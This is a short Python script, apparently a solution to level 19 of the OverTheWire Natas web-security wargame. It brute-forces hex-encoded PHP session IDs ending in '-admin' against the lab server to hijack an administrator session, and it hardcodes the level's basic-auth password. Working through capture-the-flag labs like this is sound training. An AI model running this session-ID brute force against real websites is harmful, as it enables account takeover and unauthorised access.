import requests
from requests.auth import HTTPBasicAuth

# cfduid = '__cfduid=d3939aa57bc3e1df0de30e870aa0fa6b51552234636; '
# utma = '__utma=176859643.1837799334.1552234637.1553887875.1554142555.20; '
# utmz = '__utmz=176859643.1552241337.3.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); '

uri = 'http://natas19.natas.labs.overthewire.org/index.php?debug'

# Use this forloop to grab some cookies from the respons. 
# for i in range(1,2000):
#     r = requests.post(
#         uri,
#         auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'),
#         data={'username' : 'natas19', 'password' : 'test' })
#         ## OR ##
#         data={'username' : 'admin', 'password' : 'admin' })
#     print(r.cookies)

# natas19_test = '2d6e617461733139'
natas19_test = '-natas19'.encode('hex')
# admin_admin = '2d61646d696e'
admin_admin = '-admin'.encode('hex')

for i in range(641,0,-1):
    # sessid = 'PHPSESSID=' + sessid + admin_admin
    sessid = str(i).encode('hex') + admin_admin
    r = requests.post( uri,
        auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'),
        cookies={'PHPSESSID': sessid})
        # headers = {'Cookie': cfduid + utma + utmz + sessid})
    print(sessid)
    if 'regular' not in r.text and 'form' not in r.text:
        print(r.text)
        break
